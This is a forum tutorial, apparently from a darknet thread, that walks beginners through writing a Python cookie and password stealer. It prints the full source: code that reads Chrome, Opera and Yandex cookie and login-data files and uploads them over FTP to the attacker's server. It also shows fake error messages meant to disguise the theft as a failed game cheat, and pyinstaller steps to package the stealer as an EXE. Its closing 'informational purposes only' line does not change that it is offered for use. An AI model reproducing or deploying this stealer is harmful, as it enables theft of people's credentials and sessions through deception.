# Cookies-Password-Stealer
Onnion link: http://darknet3p74rr5uste7zyw7rpzhwm52quvqodsxbimcvkwm2yah2xiid.onion/threads/create-ur-own-cookie-password-stealer-with-python-very-ez-for-beginners.3605/


Hidden Content


[align=start]Let's start with the simplest: connecting libraries.[/align]
[align=start]Python:[/align]
Quote:
import os.path
import getpass
from ftplib import FTP
import random
con = FTP ("host", "login", "password")
[align=start] [/align]
the first library (os.path) - used to check a directory for validity, more precisely, for whether it exists in nature
the second library (getpass) - is used to get the username of the user under which the process is running, this is needed to access the AppData folder
the third library (ftplib) - here is the most interesting, it will help us send passwords via FTP to our server
the fourth library (random) - well, everything is simple here, we randomize the names of the file that we send to the server
And finally, we connect via ftp by login, password and host.
[align=start] [/align]
[align=start]================================[/align]
[align=start]Now let's move on to more interesting things than just libraries, we will already write the paths to the directories where our passwords are located, and we will steal passwords from browsers - Opera, Yandex, Google Chrome[/align]
So, here is the code, we write it, then we will analyze it
[align=start]Python:[/align]
Quote:
UserName = '\\' + getpass.getuser ()
dir_cookie_google = 'C: \\ Users' + UserName + '\\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Cookies'
dir_pass_google = " C: \\ Users "+ UserName +" \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Login Data "

dir_cookie_yandex =" C: \\ Users "+ UserName +" \\ AppData \\ Local \\ Yandex \\ YandexBrowser \\ User Data \\ Default \\ Cookies "
dir_pass_yandex =" C: \\ Users "+ UserName +" \\ AppData \\ Local \\ Yandex \\ YandexBrowser \\ User Data \\ Default \ \ Password Checker "

dir_cookie_opera =" C: \\ Users "+ UserName +" \\ AppData \\ Roaming \\ Opera Software \\ Opera Stable \\ Cookies "
dir_pass_opera =" C: \\ Users "+ UserName +"\\ AppData \\ Roaming \\ Opera Software \\ Opera Stable \\ Login Data "
[align=start] [/align]
[align=start]UserName - accepts the name of the current user[/align]
[align=start]dir_cookie_google, dir_pass_google, ...., ... - etc. These are all directories where passwords are stored, we are interested in these 3 browsers. We will pick up passwords and cookies and transfer them to our server via FTP. Then open it in sqlite manager, but more on that later ...[/align]
[align=start] [/align]
[align=start]================================[/align]
[align=start]We have directories, we have libraries to work with, what next? It's time to get down to the main task - writing the stealer.[/align]
[align=start]Python:[/align]
Quote:
dir_google = "C: \\ Users" + UserName + "\\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Safe Browsing Cookies"
dir_firefox = "C: \\ Users" + UserName + "\\ AppData \ \ Roaming \\ Mozilla \\ Firefox "
dir_yandex =" C: \\ Users "+ UserName +" \\ AppData \\ Local \\ Yandex "
dir_opera =" C: \\ Users "+ UserName +" \\ AppData \\ Roaming \ \ Opera Software "

def check ():
if (os.path.exists (dir_google)) == True:
filename =" google "+ str (random.randint (1, 10000))
filename2 =" google_pass "+ str (random .randint (1, 10000))
with open (dir_cookie_google, "rb") as content:
con.storbinary ("STOR% s"% filename,content)
with open (dir_pass_google, "rb") as content:
con.storbinary ("STOR% s"% filename2, content)
if (os.path.exists (dir_opera)) == True:
filename = "opera" + str (random.randint (1, 10000))
filename2 = "opera_pass" + str (random.randint (1, 10000))
with open (dir_cookie_opera, "rb") as content:
con.storbinary ("STOR% s"% filename, content)
with open (dir_pass_opera, "rb") as content:
con.storbinary ("STOR% s"% filename2, content )
if (os.path.exists (dir_yandex)) == True:
filename = "yandex" + str (random.randint (1, 10000))
filename2 = "yandex_pass" + str (random.randint (1, 10000))
with open (dir_cookie_yandex, "rb") as content:
con.storbinary ("STOR% s "% filename, content)
with open (dir_pass_yandex, "rb") as content:
[align=start] [/align]
[align=start]The code turned out to be not small, which is what it is. Let's take a look at the first lines. At the beginning, before the function, we write the addresses of our directories to variables for subsequent validation. "Why is this necessary?" - you ask me. It's easier that way! Why put try, except when you can check for validity using os.path.exits.[/align]
[align=start] [/align]
[align=start]================================[/align]
[align=start]Next comes the function, with sets if, but there is nothing complicated here, everything is simple:[/align]
[align=start]Python:[/align]
Quote:
if (os.path.exists (dir_google)) == True:
filename = "google" + str (random.randint (1, 10000))
filename2 = "google_pass" + str (random.randint (1, 10000))
with open (dir_cookie_google, "rb") as content:
con.storbinary ("STOR% s"% filename, content)
with open (dir_pass_google, "rb") as content:
con.storbinary ("STOR% s"% filename2, content )
[align=start] [/align]
[align=start]We check if the directory is valid, and then open it and send the file to our FTP server. Tax ... The function was written, the libraries were connected, there are directories. What is missing? I think it's not enough to use the function and display some pseudo-error on the screen, saying that the library is not connected and that's all. We will act according to this scheme))[/align]
[align=start]Python:[/align]
Quote:
check ()
print ("Error library import HOUII.dll")
print ("Error RUN cheat")
input ()
[align=start] [/align]
The first line is a call to a function that steals passwords.
Next, we display "error" messages so that the user thinks that this is his problem. And that the program was not malicious, but, on the contrary, was trying to help. But, as it turned out, you see, he doesn't have a library))
[align=start] [/align]
[align=start]================================[/align]
[align=start]That's the whole code, below it is in full:[/align]
[align=start]Python:[/align]
Quote:
import os.path
import getpass
from ftplib import FTP
import random

con = FTP ("host", "login", "password")

"" "
Hack to directory
" ""

UserName = '\\' + getpass.getuser ()

dir_cookie_google = 'C: \\ Users' + UserName + '\\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Cookies'
dir_pass_google = "C: \\ Users" + UserName + "\\ AppData \ \ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Login Data "
dir_cookie_yandex =" C: \\ Users "+ UserName +" \\ AppData \\ Local \\ Yandex \\ YandexBrowser \\ User Data \\ Default \\ Cookies "
dir_pass_yandex =" C: \\ Users "+ UserName +"\\ AppData \\ Local \\ Yandex \\ YandexBrowser \\ User Data \\ Default \\ Password Checker "
dir_cookie_opera = "C: \\ Users" + UserName + "\\ AppData \\ Roaming \\ Opera Software \\ Opera Stable \\ Cookies"
dir_pass_opera = "C: \\ Users" + UserName + "\\ AppData \\ Roaming \\ Opera Software \\ Opera Stable \\ Login Data "
dir_google =" C: \\ Users "+ UserName +" \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Safe Browsing Cookies "
dir_firefox =" C: \\ Users "+ UserName +" \\ AppData \\ Roaming \\ Mozilla \\ Firefox "
dir_yandex =" C: \\ Users "+ UserName +" \\ AppData \\ Local \\ Yandex "
dir_opera =" C: \\ Users "+ UserName +" \\ AppData \\ Roaming \\ Opera Software "

def check ():
if (os.path.exists (dir_google)) == True:
filename =" google "+ str (random.randint (1,10000))
filename2 = "google_pass" + str (random.randint (1, 10000))
with open (dir_cookie_google, "rb") as content:
con.storbinary ("STOR% s"% filename, content)
with open (dir_pass_google, "rb") as content:
con.storbinary ("STOR% s"% filename2, content)
if (os.path.exists (dir_opera)) == True:
filename = "opera" + str (random.randint (1, 10000))
filename2 = "opera_pass" + str (random.randint (1, 10000) )
with open (dir_cookie_opera, "rb") as content:
con.storbinary ("STOR% s"% filename, content)
with open (dir_pass_opera, "rb") as content:
con.storbinary ("STOR% s"% filename2 , content)
if (os.path.exists (dir_yandex)) == True:
filename = "yandex" + str (random.randint (1, 10000))
filename2 = "yandex_pass" + str (random.randint (1, 10000))
with open (dir_cookie_yandex, "rb") as content:
con.storbinary ( "STOR% s"% filename, content)
with open (dir_pass_yandex, "rb") as content:
con.storbinary ("STOR% s"% filename2, content)

check ()
print ("Error library import HOUII.dll")
print ("Error RUN cheat")
input ()
[align=start] [/align]
[align=start]================================[/align]
[align=start]We have the code, but it's on python, we exploit it on the pc using pyinstaller[/align]
[align=start]Download it:[/align]
[align=start]Bash:[/align]
Quote:
pip install pyinstaller

[align=start]Next, let's compile it into an EXE, to make everything easier))[/align]
Quote:
pyinstaller -F 'file name'

The information is provided for informational purposes only!
